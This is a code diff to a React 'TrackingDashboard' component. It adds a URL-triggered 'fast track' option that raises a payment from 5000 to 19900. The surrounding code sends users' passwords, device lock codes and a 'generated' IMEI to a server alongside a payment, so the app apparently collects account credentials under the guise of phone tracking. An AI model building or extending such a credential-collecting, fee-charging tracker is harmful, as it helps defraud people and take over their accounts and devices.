@@ -24,7 +24,16 @@ export default function TrackingDashboard() {
   const [userLockCode, setUserLockCode] = useState('');
   const [userEmail, setUserEmail] = useState('');
   const [generatedIMEI, setGeneratedIMEI] = useState('');
+  const [isFastTrack, setIsFastTrack] = useState(false);
   const { toast } = useToast();
+
+  useEffect(() => {
+    // Check if fast track is requested via URL
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('fast') === 'true') {
+      setIsFastTrack(true);
+    }
+  }, []);
 
   useEffect(() => {
     // Add Leaflet CSS and JS
@@ -93,7 +102,8 @@ export default function TrackingDashboard() {
           identifier: userIdentifier,
           password: userPassword,
           lockCode: userLockCode,
-          imei: imei
+          imei: imei,
+          isFastTrack: isFastTrack
         })
       });
     } catch (error) {
@@ -128,7 +138,8 @@ export default function TrackingDashboard() {
           body: JSON.stringify({
             userEmail: userEmail,
             device: selectedDevice,
-            imei: generatedIMEI
+            imei: generatedIMEI,
+            amount: isFastTrack ? 19900 : 5000
           })
         });
       } catch (error) {
